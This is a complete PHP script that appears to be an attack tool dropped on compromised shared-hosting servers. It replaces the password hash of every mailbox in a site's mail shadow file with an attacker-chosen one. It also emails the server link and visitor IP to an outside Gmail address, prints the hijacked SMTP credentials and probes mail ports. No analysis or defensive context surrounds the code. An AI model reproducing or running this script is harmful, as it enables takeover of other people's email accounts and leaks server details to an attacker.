<?php set_time_limit(0); ini_set('max_execution_time',0); ini_set('memory_limit',-1); $ports=array(25, 587, 465, 110, 995, 143 , 993); $primary_port='25'; $user=get_current_user(); $ip = getenv("REMOTE_ADDR"); $hostname = gethostbyaddr($ip); $bilsmg = "Link Smtp : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "\r\n"; $bilsnd ="dz.cr4ck3r@gmail.com"; $bilsub = "New Smtp Uploaded !! $ip"; $bilhead = "From: SMTP"; $bilhead .= $_POST['eMailAdd']."\n"; $bilhead .= "MIME-Version: 1.0\n"; $arr=array($bilsnd, $IP); foreach ($arr as $bilsnd) mail($bilsnd,$bilsub,$bilsmg,$bilhead,$message); $password='Sankess*+.'; $pwd = crypt($password,'$6$roottn$'); $t = $_SERVER['SERVER_NAME']; $t = @str_replace("www.","",$t); @$passwd = file_get_contents('/home/'.$user.'/etc/'.$t.'/shadow'); $ex=explode("\r\n",$passwd); @link('/home/'.$user.'/etc/'.$t.'/shadow','/home/'.$user.'/etc/'.$t.'/shadow.roottn.bak'); @unlink('/home/'.$user.'/etc/'.$t.'/shadow'); foreach($ex as $ex){ $ex=explode(':',$ex); $e= $ex[0]; if ($e){ $b=fopen('/home/'.$user.'/etc/'.$t.'/shadow','ab');fwrite($b,$e.':'.$pwd.':16249:::::'."\r\n");fclose($b); echo '<span style=\'color:#00ff00;\'>'.$t.'|25|'.$e.'@'.$t.'|'.$password.'</span><br>'; "</center>"; }} foreach ($ports as $port) { $connection = @fsockopen($t, $port, $errno, $errstr, 2); if (is_resource($connection)) { echo '<h2>' . $host . ':' . $port . ' ' . '(' . getservbyport($port, 'tcp') . ') is open.</h2>' . "\n"; fclose($connection); } } ?>
